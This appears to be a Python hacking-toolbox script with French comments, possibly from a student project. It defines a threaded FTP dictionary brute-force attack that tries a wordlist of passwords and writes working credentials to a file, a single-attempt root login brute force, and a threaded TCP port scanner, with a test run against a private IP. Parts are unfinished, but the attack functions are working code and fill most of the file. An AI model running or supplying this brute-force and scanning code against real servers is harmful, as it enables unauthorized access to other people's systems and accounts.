#!/usr/bin/python
from logging import Logging
import threading, socket, ftplib, re
from datetime import datetime
from ftp import FTP
# pas de copier coller bêtement
# s'avoir expliqué votre code
# commanté les grande partie de votre code
# dev a l'interieur du if __main__
# pour pas géné l'autre partie du code
class TOOLS():
	def __init__(self) :
		self.FILE_LOG = "Folder_log/tools.log"
		self.logging = Logging(self.FILE_LOG)
		pass

	#TODO :a voir
	def TestConnection (self,IP):
		pass

	#TODO : sur le ftp
	def BruteForce (self,IP,nombre_caractaire):

		USER = "root"

		try :
			ftplib.FTP(IP,USER,nombre_caractaire)
		except(ConnectionRefusedError):
			print("port fermé")
		except(ftplib.error_perm):
			print("impoissible de se log")
		else:
			print ("ok")


	def BruteForce_dico (self,file,ip,user):
		def BruteForce(ip,user,pwd,FILE):
			try:
				ftplib.FTP(ip,user,pwd)
			except(ConnectionRefusedError):
				pass
			except(ftplib.error_perm):
				pass
			else:

				FILE = open(FILE,"a+") 
				FILE.write(ip + user + pwd + "\n")
				FILE.close()

		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
		FILE = "TOOLS/"+"BRUTE_FORCE"+DATE

		contenu = open(file,"r")
		lines = contenu.readlines()
		for pwd in lines:
			threading.Thread(target=BruteForce, args=(ip,user,pwd,FILE)).start()

		return FILE

	#TODO TRY
	def ScanPorts (self,IP,port_min,port_max):
		def Scan(IP,port,FILE):
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			result = sock.connect_ex((IP,port))
			if result == 0:
				FILE = open(FILE,"a+") 
				FILE.write(str(port) + "\n")
				FILE.close()

				#METTRE DANS UN CSV
				return port
			sock.close()

		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
		FILE = "TOOLS/"+"SCAN_PORT"+DATE

		IP = str(IP)
		port_min = int(port_min)
		port_max = int(port_max)

		while port_min < port_max:
			threading.Thread(target=Scan, args=(IP,port_min,FILE)).start()
			port_min = port_min + 1
		return FILE






if __name__ == '__main__':
	print ("veillez importer le script")
	#
	# LES TESTS
	#
	boite_a_outils = TOOLS()
	IP = "172.20.20.1"
	boite_a_outils.ScanPorts(IP,"1","600")

	#boite_a_outils.BruteForce(IP,0)

	"""
	LETRE="ABCDC"
	list=[]
	list[:0]=LETRE


	for l in list:
		chaine = l
		print (chaine)
		for l2 in list:
			chaine = l + l2
			print (chaine)
			for l3 in list:
				chaine = l + l2 + l3
				print (chaine)
				for l4 in list:
					chaine = l + l2 + l3 + l4
					print (chaine)
					for l5 in list:
						chaine = l + l2 + l3 + l4 + l5
						print (chaine)
	"""


	# Driver code
	



	pass
else:
	print ("Le script tools a été importer avec succès")